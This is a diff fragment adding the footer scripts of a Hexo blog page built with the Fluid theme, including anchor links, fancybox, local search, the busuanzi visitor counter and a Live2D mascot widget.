+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2d/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2d/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":80,"vOffset":-20},"mobile":{"show":true,"scale":0.8},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
